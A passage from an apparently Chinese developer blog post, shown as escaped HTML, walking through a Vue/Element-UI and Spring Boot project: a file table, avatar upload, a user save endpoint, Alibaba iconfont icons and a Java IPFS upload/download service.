class=&quot;el-icon-remove-outline&quot;&gt;&lt;/i&gt;&lt;/el-button&gt;\n      &lt;/el-popconfirm&gt;\n    &lt;/div&gt;\n\n    &lt;el-table :data=&quot;tableData&quot; border stripe  @selection-change=&quot;handleSelectionChange&quot;&gt;\n      &lt;el-table-column type=&quot;selection&quot; width=&quot;55&quot;&gt;&lt;/el-table-column&gt;\n      &lt;el-table-column prop=&quot;id&quot; label=&quot;ID&quot; width=&quot;80&quot;&gt;\n      &lt;/el-table-column&gt;\n      &lt;el-table-column prop=&quot;name&quot; label=&quot;文件名称&quot; &gt;\n      &lt;/el-table-column&gt;\n      &lt;el-table-column prop=&quot;type&quot; label=&quot;文件类型&quot;&gt;\n      &lt;/el-table-column&gt;\n      &lt;el-table-column prop=&quot;size&quot; label=&quot;文件大小(KB)&quot;&gt;\n      &lt;/el-table-column&gt;\n      &lt;el-table-column  label=&quot;下载&quot;&gt;\n        &lt;template v-slot=&quot;scope&quot;&gt;\n          &lt;el-button type=&quot;primary&quot; @click=&quot;download(scope.row.url)&quot;&gt;下载&lt;/el-button&gt;\n        &lt;/template&gt;\n      &lt;/el-table-column&gt;\n      &lt;el-table-column label=&quot;启用&quot;&gt;\n        &lt;template v-slot=&quot;scope&quot;&gt;\n          &lt;!--switch开关--&gt;\n          &lt;el-switch v-model=&quot;scope.row.enable&quot; active-color=&quot;#13ce66&quot; inactive-color=&quot;#ccc&quot; @change=&quot;changeEnable(scope.row)&quot;&gt;&lt;/el-switch&gt;\n        &lt;/template&gt;\n      &lt;/el-table-column&gt;\n      &lt;el-table-column label=&quot;操作&quot;&gt;\n        &lt;templete v-slot=&quot;scope&quot;&gt;\n          &lt;!--一个添加气泡对话框--&gt;\n          &lt;el-popconfirm\n              class=&quot;ml-5&quot;\n              confirm-button-text='确定'\n              cancel-button-text='我再想想'\n              icon=&quot;el-icon-info&quot;\n              icon-color=&quot;red&quot;\n              title=&quot;您确定删除吗？&quot; @confirm=&quot;handleDelete(scope.row.id)&quot;\n          &gt;\n            &lt;el-button type=&quot;danger&quot; slot=&quot;reference&quot; &gt;删除&lt;i class=&quot;el-icon-remove-outline&quot;&gt;&lt;/i&gt;&lt;/el-button&gt;\n          &lt;/el-popconfirm&gt;\n        &lt;/templete&gt;\n      &lt;/el-table-column&gt;\n    &lt;/el-table&gt;\n    &lt;div style=&quot;padding: 10px 0&quot;&gt;\n      &lt;el-pagination\n          @size-change=&quot;handleSizeChange&quot;\n          @current-change=&quot;handleCurrentChange&quot;\n          :current-page=&quot;pageNum&quot;\n          :page-sizes=&quot;[2, 5, 10,20 ]&quot;\n          :page-size=&quot;pageSize&quot;\n          layout=&quot;total, sizes, prev, pager, next, jumper&quot;\n          :total=&quot;total&quot;&gt;\n      &lt;/el-pagination&gt;\n    &lt;/div&gt;\n  &lt;/div&gt;\n&lt;/template&gt;\n\n&lt;style scoped&gt;\n\n&lt;/style&gt;\n</code></pre>\n<p>侧边栏更新 Aside.vue</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240121225702462.png\" alt=\"image-20240121225702462\" /></p>\n<p>路由更新</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240121225723285.png\" alt=\"image-20240121225723285\" /></p>\n<p>成功展示</p>\n<p>后端继续完善<strong>启用</strong>的接口</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240121235908085.png\" alt=\"image-20240121235908085\" /></p>\n<p>然后是个人信息的<strong>头像上传</strong></p>\n<p>Person.vue</p>\n<pre><code class=\"language-vue\">&lt;script&gt;\nexport default &#123;\n  name: &quot;Person&quot;,\n  data()&#123;\n    return&#123;\n      form: &#123;&#125;,\n      user: localStorage.getItem(&quot;user&quot;) ? JSON.parse(localStorage.getItem(&quot;user&quot;)) : &#123;&#125;\n    &#125;\n  &#125;,\n  created() &#123;\n    this.getUser().then(res =&gt;&#123;\n      console.log(res)\n      this.form = res\n    &#125;)\n  &#125;,\n  methods: &#123;\n    reset() &#123;\n      this.form.username = &quot;&quot;\n      this.form.nickname = &quot;&quot;\n      this.form.email = &quot;&quot;\n      this.form.phone = &quot;&quot;\n      this.form.address = &quot;&quot;\n    &#125;,\n    async getUser()&#123;\n      return (await this.request.get(&quot;/user/username/&quot; + this.user.username)).data\n    &#125;,\n    save() &#123;\n      this.request.post(&quot;/user/addorupdate&quot;, this.form).then(res =&gt; &#123;\n        if (res.code === '200') &#123;\n          this.$message.success(&quot;保存成功&quot;)\n\n          // 触发父级更新User的方法\n          this.$emit(&quot;refreshUser&quot;)\n\n          // 更新浏览器存储的用户信息\n          this.getUser().then(res =&gt; &#123;\n            res.token = JSON.parse(localStorage.getItem(&quot;user&quot;)).token\n            localStorage.setItem(&quot;user&quot;, JSON.stringify(res))\n          &#125;)\n        &#125; else &#123;\n          this.$message.error(&quot;保存失败&quot;)\n        &#125;\n      &#125;)\n    &#125;,\n    handleAvatarSuccess(res)&#123;\n      this.form.avatarUrl = res\n    &#125;\n  &#125;\n&#125;\n&lt;/script&gt;\n\n&lt;template&gt;\n  &lt;div&gt;\n    &lt;el-card style=&quot;width: 500px; padding: 20px;&quot;&gt;\n      &lt;el-form label-width=&quot;80px&quot; size=&quot;small&quot;&gt;\n        &lt;el-upload\n\n            class=&quot;avatar-uploader&quot;\n            action=&quot;http://localhost:9090/file/upload&quot;\n            :show-file-list=&quot;false&quot;\n            :on-success=&quot;handleAvatarSuccess&quot;\n        &gt;\n          &lt;img v-if=&quot;form.avatarUrl&quot; :src=&quot;form.avatarUrl&quot; class=&quot;avatar&quot;&gt;\n          &lt;i v-else class=&quot;el-icon-plus avatar-uploader-icon&quot;&gt;&lt;/i&gt;\n        &lt;/el-upload&gt;\n\n        &lt;el-form-item label=&quot;用户名&quot;&gt;\n          &lt;el-input v-model=&quot;form.username&quot; autocomplete=&quot;off&quot;&gt;&lt;/el-input&gt;\n        &lt;/el-form-item&gt;\n        &lt;el-form-item label=&quot;昵称&quot;&gt;\n          &lt;el-input v-model=&quot;form.nickname&quot; autocomplete=&quot;off&quot;&gt;&lt;/el-input&gt;\n        &lt;/el-form-item&gt;\n        &lt;el-form-item label=&quot;邮箱&quot;&gt;\n          &lt;el-input v-model=&quot;form.email&quot; autocomplete=&quot;off&quot;&gt;&lt;/el-input&gt;\n        &lt;/el-form-item&gt;\n        &lt;el-form-item label=&quot;电话&quot;&gt;\n          &lt;el-input v-model=&quot;form.phone&quot; autocomplete=&quot;off&quot;&gt;&lt;/el-input&gt;\n        &lt;/el-form-item&gt;\n        &lt;el-form-item label=&quot;地址&quot;&gt;\n          &lt;el-input v-model=&quot;form.address&quot; autocomplete=&quot;off&quot;&gt;&lt;/el-input&gt;\n        &lt;/el-form-item&gt;\n        &lt;el-form-item&gt;\n          &lt;el-button type=&quot;primary&quot; @click=&quot;save&quot;&gt;确 定&lt;/el-button&gt;\n          &lt;el-button class=&quot;ml-5&quot; type=&quot;warning&quot; @click=&quot;reset&quot;&gt;清 空&lt;/el-button&gt;\n        &lt;/el-form-item&gt;\n      &lt;/el-form&gt;\n    &lt;/el-card&gt;\n  &lt;/div&gt;\n&lt;/template&gt;\n\n&lt;style scoped&gt;\n.avatar-uploader&#123;\n  text-align: center;\n  padding-bottom:10px ;\n&#125;\n.avatar-uploader .el-upload &#123;\n  border: 1px dashed #d9d9d9;\n  border-radius: 6px;\n  cursor: pointer;\n  position: relative;\n  overflow: hidden;\n&#125;\n.avatar-uploader .el-upload:hover &#123;\n  border-color: #409EFF;\n&#125;\n.avatar-uploader-icon &#123;\n  font-size: 28px;\n  color: #8c939d;\n  width: 178px;\n  height: 178px;\n  line-height: 178px;\n  text-align: center;\n&#125;\n.avatar &#123;\n  width: 138px;\n  height: 138px;\n  display: block;\n&#125;\n&lt;/style&gt;\n</code></pre>\n<p>UserController.java 新增接口</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> * 新增或者更新接口</pre></td></tr><tr><td data-num=\"3\"></td><td><pre> * @param user</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> * @return</pre></td></tr><tr><td data-num=\"5\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token annotation punctuation\">@PostMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/addorupdate\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">Result</span> <span class=\"token function\">save</span><span class=\"token punctuation\">(</span><span class=\"token annotation punctuation\">@RequestBody</span> <span class=\"token class-name\">User</span> user<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token class-name\">String</span> username <span class=\"token operator\">=</span> user<span class=\"token punctuation\">.</span><span class=\"token function\">getUsername</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">StrUtil</span><span class=\"token punctuation\">.</span><span class=\"token function\">isBlank</span><span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>       <span class=\"token keyword\">return</span> <span class=\"token class-name\">Result</span><span class=\"token punctuation\">.</span><span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constants</span><span class=\"token punctuation\">.</span><span class=\"token constant\">CODE_400</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"参数错误\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token class-name\">Result</span><span class=\"token punctuation\">.</span><span class=\"token function\">success</span><span class=\"token punctuation\">(</span>userService<span class=\"token punctuation\">.</span><span class=\"token function\">saveOrUpdate</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>数据库更新的 URL</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240122110659529.png\" alt=\"image-20240122110659529\" /></p>\n<h1 id=\"vueelement-ui项目内使用阿里图标库\"><a class=\"anchor\" href=\"#vueelement-ui项目内使用阿里图标库\">#</a> vue+element-ui 项目内使用阿里图标库</h1>\n<p>从官网<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaWNvbmZvbnQuY24v\"> iconfont - 阿里巴巴矢量图标库</span>找到想要的 icon</p>\n<p>入库 —— 添加到项目 —— 下载至本地</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240122212616485.png\" alt=\"image-20240122212616485\" /></p>\n<p>下载后解压，文件夹重命名 icon，放到<strong> vue/src/assets/icon</strong> 下</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240122213141184.png\" alt=\"image-20240122213141184\" /></p>\n<p>main.js 导入全局</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240122213327057.png\" alt=\"image-20240122213327057\" /></p>\n<p>i 标签导入 icon，两层 iconfont + icon-xxxx</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240122213729706.png\" alt=\"image-20240122213729706\" /></p>\n<h1 id=\"前端-ipfs-后端\"><a class=\"anchor\" href=\"#前端-ipfs-后端\">#</a> 前端 --&gt;ipfs&lt;-- 后端</h1>\n<p>前端上传文件至 IPFS，生成哈希值传给后端，后端接口存入数据库</p>\n<p>js-IPFS 已经被废弃，新的叫做<strong> Helia (总)</strong></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2lwZnMvaGVsaWE=\">GitHub - ipfs/helia：JavaScript 中 IPFS 的实现</span></p>\n<p>**ipfs-core (核心组件)**<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubnBtanMuY29tL3BhY2thZ2UvaXBmcy1jb3Jl\">https://www.npmjs.com/package/ipfs-core</span></p>\n<pre><code>cd vue\nnpm i ipfs-core\n</code></pre>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8yOTQ5MTg4NS9hcnRpY2xlL2RldGFpbHMvMTA5MzkwNDk2\">前端利用 ipfs 上传文件_前端获取 ipfs-CSDN 博客</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRlZS5jb20vamF5NDg3MS9oZV9jb250cmFjdD9za2lwX21vYmlsZT10cnVlI2NvbnRyb2xsZXI=\">https://gitee.com/jay4871/he_contract?skip_mobile=true#controller</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9maXNjby1iY29zLWRvY3VtZW50YXRpb24ucmVhZHRoZWRvY3MuaW8vemgtY24vbGF0ZXN0L2RvY3Mvd2ViYXNlL3dlYmFzZS5odG1s\">https://fisco-bcos-documentation.readthedocs.io/zh-cn/latest/docs/webase/webase.html</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0LzIzMDJfNzczMzk4MDIvYXJ0aWNsZS9kZXRhaWxzLzEzNDM2NjA5Ng==\">https://blog.csdn.net/2302_77339802/article/details/134366096</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYXBsbG8tbHd4L3AvMTQ4ODY2OTUuaHRtbA==\">IPFS 使用教程 | java 对接 IPFS 的 SDK - lwx-apllo - 博客园 (cnblogs.com)</span></p>\n<p>后端依赖</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>repositories</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>repository</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>id</span><span class=\"token punctuation\">></span></span>jitpack.io<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>id</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>url</span><span class=\"token punctuation\">></span></span>https://jitpack.io<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>url</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>repository</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>repositories</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">&lt;!--ps：此处一定要下载最新版本的 client：v1.3.3，旧版本 client 采用 GET 的方式发送 HTTP 请求，会导致在新的 IPFS 服务连接出现 405 报错 --></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependencies</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>com.github.ipfs<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>java-ipfs-http-client<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">></span></span>v1.3.3<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependencies</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>application.yaml</p>\n<figure class=\"highlight yml\"><figcaption data-lang=\"YAML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token key atrule\">ipfs</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token key atrule\">config</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token key atrule\">multi-addr</span><span class=\"token punctuation\">:</span> /ip4/127.0.0.1/tcp/5001 <span class=\"token comment\"># ipfs 的服务器地址和端口</span></pre></td></tr></table></figure><p>service 接口</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IOException</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">interface</span> <span class=\"token class-name\">IpfsService</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>     * 指定 path + 文件名称，上传至 ipfs</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>     *</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>     * @param filePath</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>     * @return</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>     * @throws IOException</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>     */</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token class-name\">String</span> <span class=\"token function\">uploadToIpfs</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> filePath<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre> </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>     * 将 byte 格式的数据，上传至 ipfs</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>     *</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>     * @param data</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>     * @return</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>     * @throws IOException</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>     */</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token class-name\">String</span> <span class=\"token function\">uploadToIpfs</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> data<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre> </pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>     * 根据 Hash 值，从 ipfs 下载内容，返回 byte 数据格式</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>     *</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>     * @param hash</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>     * @return</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>     */</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token function\">downFromIpfs</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> hash<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre> </pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>     * 根据 Hash 值，从 ipfs 下载内容，并写入指定文件 destFilePath</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>     *</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>     * @param hash</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>     * @param destFilePath</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>     */</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">void</span> <span class=\"token function\">downFromIpfs</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> hash<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> destFilePath<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>service 实现类</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token annotation punctuation\">@Service</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">IpfsServiceImpl</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">IpfsService</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">//ipfs 的服务器地址和端口，与 yaml 文件中的配置对应</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token annotation punctuation\">@Value</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"$&#123;ipfs.config.multi-addr&#125;\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> multiAddr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">IPFS</span> ipfs<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token annotation punctuation\">@PostConstruct</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setMultiAddr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        ipfs <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">IPFS</span><span class=\"token punctuation\">(</span>multiAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre> </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">uploadToIpfs</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> filePath<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token class-name\">NamedStreamable<span class=\"token punctuation\">.</span>FileWrapper</span> file <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">NamedStreamable<span class=\"token punctuation\">.</span>FileWrapper</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">(</span>filePath<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre> </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token class-name\">MerkleNode</span> addResult <span class=\"token operator\">=</span> ipfs<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">return</span> addResult<span class=\"token punctuation\">.</span>hash<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre> </pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> <span class=\"token function\">uploadToIpfs</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> data<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token class-name\">NamedStreamable<span class=\"token punctuation\">.</span>ByteArrayWrapper</span> file <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">NamedStreamable<span class=\"token punctuation\">.</span>ByteArrayWrapper</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token class-name\">MerkleNode</span> addResult <span class=\"token operator\">=</span> ipfs<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">return</span> addResult<span class=\"token punctuation\">.</span>hash<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre> </pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token function\">downFromIpfs</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> hash<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> data 